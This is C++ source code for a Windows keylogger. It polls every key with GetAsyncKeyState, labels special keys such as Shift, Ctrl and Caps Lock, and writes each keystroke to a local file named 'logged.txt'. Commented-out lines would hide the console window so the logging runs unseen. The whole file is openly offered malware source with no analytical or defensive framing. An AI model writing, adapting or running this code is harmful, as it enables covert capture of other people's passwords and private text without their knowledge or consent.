#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
#include <time.h>
#include <algorithm>
using namespace std;

#define LOG_FILE "logged.txt"
ofstream outputLog (LOG_FILE);

string outputSpecialKey(char key) {
    string result;

    switch (key)
    {
    case VK_SPACE:
        result = " ";
        break;
    case VK_RETURN:
        result = "\n";
        break;
    case VK_SHIFT:
        result = "[SHIFT]";
        break;
    case VK_BACK:
        result = "\b";
        break;
    case VK_TAB:
        result = "\t";
        break;
    case VK_CONTROL:
        result = "[CTRL]";
        break;
    case VK_MENU:
        result = "[ALT]";
        break;
    case VK_CAPITAL:
        result = "[CAPS_LOCK]";
        break;
    case VK_DELETE:
        result = "[DELETE]";
        break;
    case VK_ESCAPE:
        result = "[ESCAPE]";
        break;
    default:
        break;
    }

    return result;
}

int main()
{
    int specialKeys[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB,
        VK_CONTROL, VK_MENU, VK_CAPITAL, VK_DELETE, VK_ESCAPE};

    // HWND hwnd = GetConsoleWindow();
    // ShowWindow(hwnd, SW_HIDE);

    while (true) {
        for (int i = 0; i < 256; i++) {
            if (GetAsyncKeyState((char)i) & 0xF) {
                string output;

                if (count(begin(specialKeys), end(specialKeys), i) > 0) {
                    output = outputSpecialKey((char)i);
                } else {
                    bool isUpper = false;
                    if (GetKeyState(VK_SHIFT) & 0x1) {
                        isUpper = !isUpper;
                    }
                    if (GetKeyState(VK_CAPITAL) & 0x1) {
                        isUpper = !isUpper;
                    }
                    
                    if (isUpper) {
                        output = (char)i;
                    } else {
                        output = tolower((char)i);
                    }
                }
                outputLog << output;;
                outputLog.put('\n');
            }
        }
    }

    return 0;
}